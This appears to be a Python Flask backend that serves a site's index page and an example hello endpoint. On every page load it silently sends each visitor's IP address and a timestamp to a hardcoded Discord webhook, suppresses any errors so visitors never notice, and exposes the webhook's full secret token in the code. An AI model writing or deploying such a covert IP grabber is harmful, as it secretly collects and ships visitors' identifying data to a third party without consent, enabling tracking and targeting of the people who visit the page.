from flask import Flask, jsonify, request, Response
from datetime import datetime
import requests as http_requests
import os

app = Flask(__name__)

# Path to the project root (one level up from /api)
ROOT_DIR = os.path.join(os.path.dirname(__file__), '..')

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1476256421438951526/1XbFzQdfe3YZTQN_MyA8Uc41JSBOVsgG7p747qa7i9AY66EzPbaUfxBXv0pdfwY9fLp3"
    data = {
        "content": "",
        "title": "IP"
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": date
        }
    ]
    try:
        http_requests.post(webhook_url, json=data)
    except Exception:
        pass  # Don't crash the page if the webhook fails

@app.route('/')
def index():
    """Serve the main index.html file with IP logging."""
    ip = request.headers.get("x-forwarded-for", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    send_ip(ip, date)
    html_path = os.path.join(ROOT_DIR, 'index.html')
    with open(html_path, 'r') as f:
        return Response(f.read(), mimetype='text/html')

@app.route('/api/hello')
def hello():
    """Example API endpoint."""
    return jsonify(message="Hello from the Flask backend server!")
